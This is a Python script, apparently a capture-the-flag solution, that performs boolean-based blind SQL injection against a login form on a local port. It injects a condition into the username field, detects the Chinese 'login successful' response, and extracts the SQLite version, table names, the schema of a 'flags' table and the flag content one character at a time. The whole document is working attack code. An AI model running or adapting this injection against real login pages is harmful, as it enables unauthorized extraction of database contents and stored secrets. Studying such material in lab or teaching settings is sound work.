import requests
import string

url = "http://127.0.0.1:58325"

charset = string.ascii_letters + string.digits + "_{}-@.:,()/ ="

def check(condition):
    payload = f"guest' AND ({condition}) AND '1'='1"

    data = {
        "username": payload,
        "password": "guest123"
    }

    r = requests.post(url, data=data, timeout=5)

    return "登录成功" in r.text


def dump_expr(expr, max_len=150):
    result = ""

    for pos in range(1, max_len + 1):
        for ch in charset:
            condition = f"substr(({expr}),{pos},1)='{ch}'"

            if check(condition):
                result += ch
                print(result)
                break
        else:
            break

    return result


if __name__ == "__main__":
    print("[+] SQLite version")
    version = dump_expr("SELECT sqlite_version()", 20)
    print("[*]", version)

    print("\n[+] Tables")
    for offset in range(10):
        expr = f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {offset}"
        table = dump_expr(expr, 50)

        if not table:
            break

        print(f"[*] table[{offset}] = {table}")

    print("\n[+] flags schema")
    schema = dump_expr("SELECT sql FROM sqlite_master WHERE name='flags'", 200)
    print("[*]", schema)

    print("\n[+] flag")
    flag = dump_expr("SELECT content FROM flags LIMIT 1 OFFSET 0", 100)
    print("[*] flag =", flag)